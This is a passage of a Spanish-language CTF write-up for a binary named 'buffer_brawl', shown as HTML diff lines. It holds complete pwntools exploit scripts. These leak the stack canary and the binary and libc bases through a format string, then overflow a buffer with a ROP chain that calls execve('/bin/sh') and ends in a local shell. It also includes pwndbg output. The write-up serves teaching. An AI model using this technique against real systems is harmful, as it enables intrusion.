+[</span><span class="az">*</span><span class="p">] Libc base: 0x79d216c00000
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+
+Choose:
+1. Throw a jab
+2. Throw a hook
+3. Throw an uppercut
+4. Slip
+5. Call off
+> </span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">^C
+Program received signal SIGINT, Interrupt.
+</span><span class="az">0x000079d216d147e2 </span><span class="p">in</span><span class="am"> read</span><span class="p"> () from</span><span class="ve"> ./libc.so.6</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> vmmap libc.so.6
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+</span><span class="az">    0x6337e5243000     0x6337e5264000 rw-p    21000      0 [heap]
+</span><span class="p">►   0x79d216c00000     0x79d216c28000 r--p    28000      0 /home/user/BufferBrawl/libc.so.6
+</span><span class="ro">►   0x79d216c28000     0x79d216dbd000 r-xp   195000  28000 /home/user/BufferBrawl/libc.so.6
+</span><span class="p">►   0x79d216dbd000     0x79d216e15000 r--p    58000 1bd000 /home/user/BufferBrawl/libc.so.6
+</span><span class="az">►   0x79d216e15000     0x79d216e16000 ---p     1000 215000 /home/user/BufferBrawl/libc.so.6
+</span><span class="p">►   0x79d216e16000     0x79d216e1a000 r--p     4000 215000 /home/user/BufferBrawl/libc.so.6
+</span><span class="sa">►   0x79d216e1a000     0x79d216e1c000 rw-p     2000 219000 /home/user/BufferBrawl/libc.so.6  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Vamos con la siguiente vulnerabilidad, mediante un bucle <code class="language-plaintext highlighter-rouge">for</code> restaremos <code class="language-plaintext highlighter-rouge">3</code> puntos <code class="language-plaintext highlighter-rouge">29</code> veces, esto deja a la variable <code class="language-plaintext highlighter-rouge">stack_life_points</code> en <code class="language-plaintext highlighter-rouge">13</code>, entonces ya podemos explotar el buffer overflow el cual dijimos tenia un offset a la cookie de <code class="language-plaintext highlighter-rouge">24</code> bytes, ahí enviamos el canary, <code class="language-plaintext highlighter-rouge">8 B's</code> para <code class="language-plaintext highlighter-rouge">rbp</code> y <code class="language-plaintext highlighter-rouge">8 C's</code> para el return address, además un par de <code class="language-plaintext highlighter-rouge">D's</code> que se guardarán en el stack, asi tenemos el control del flujo de ejecución</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p64, u64
+
+shell </span><span class="o">= </span><span class="p">gdb.debug(</span><span class="s">"./buffer_brawl"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"4"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"?</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"%11$p.%13$p"</span><span class="p">)
+
+leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().split(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
+
+canary</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)
+binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x1747</span><span class="p">
+
+payload</span><span class="o"> =</span><span class="p"> </span><span class="no">b</span><span class="s">"%7$s...." </span><span class="o">+ </span><span class="p">p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x3fa0</span><span class="p">) </span><span class="c1"># puts@got</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"4"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"?</span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)
+
+libc_base</span><span class="o"> =</span><span class="p"> u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"...."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"\x00"</span><span class="p">))</span><span class="o"> -</span><span class="mi"> 0x80e50</span><span class="p">  
+
+</span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">29</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"3"</span><span class="p">)
+
+offset</span><span class="o"> =</span><span class="mi"> 24</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> p64(canary)
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="mi"> 24</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">, payload)
+shell.recvline()
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Program received signal SIGSEGV, Segmentation fault.  
+</span><span class="az">0x000063b373c7647d </span><span class="p">in</span><span class="am"> stack_check_up</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> x/gx $rsp
+</span><span class="az">0x7ffc8025a808</span><span class="p">:	0x4343434343434343
+</span><span class="ro">pwndbg></span><span class="p"> x/s $rsp+8
+</span><span class="az">0x7ffc8025a810</span><span class="p">:	'D' &ltrepetidos 24 veces>
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez controlamos el return address y los valores en el stack simplemente nos queda agregar un <code class="language-plaintext highlighter-rouge">ropchain</code>, en este caso debido a problemas con <code class="language-plaintext highlighter-rouge">system</code> usamos uno que ejecute <code class="language-plaintext highlighter-rouge">execve("/bin/sh", NULL, NULL);</code> a través de una <code class="language-plaintext highlighter-rouge">syscall</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, p64, u64
+
+shell </span><span class="o">= </span><span class="p">process(</span><span class="s">"./buffer_brawl"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"4"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"?</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"%11$p.%13$p"</span><span class="p">)
+
+leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().split(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
+
+canary</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)
+binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x1747</span><span class="p">
+
+payload</span><span class="o"> =</span><span class="p"> </span><span class="no">b</span><span class="s">"%7$s...." </span><span class="o">+ </span><span class="p">p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x3fa0</span><span class="p">) </span><span class="c1"># puts@got</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"4"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"?</span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)
+
+libc_base</span><span class="o"> =</span><span class="p"> u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"...."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"\x00"</span><span class="p">))</span><span class="o"> -</span><span class="mi"> 0x80e50</span><span class="p">  
+
+</span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">29</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"3"</span><span class="p">)
+
+offset</span><span class="o"> =</span><span class="mi"> 24</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> p64(canary)
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x045eb0</span><span class="p">)</span><span class="c1"> # pop rax; ret;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x3b</span><span class="p">)</span><span class="c1">                 # execve()</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x02a3e5</span><span class="p">)</span><span class="c1"> # pop rdi; ret;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x1d8678</span><span class="p">)</span><span class="c1"> # "/bin/sh"</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x02be51</span><span class="p">)</span><span class="c1"> # pop rsi; ret;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x0</span><span class="p">)</span><span class="c1">                  # NULL</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x118f2f</span><span class="p">)</span><span class="c1"> # mov rdx, rsi; syscall;</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">, payload)
+shell.recvline()
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces, en el exploit usamos el format string para lekear el <code class="language-plaintext highlighter-rouge">canary</code> y la dirección base del binario, ya con ello lekeamos la dirección base de libc para posteriormente explotar el buffer overflow que al ejecutar el <code class="language-plaintext highlighter-rouge">ropchain</code> nos devuelve una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './buffer_brawl': pid 41976  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ro">$</span><span class="p"> id
+uid=1000(user) gid=1000(user) groups=1000(user)
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
+html>
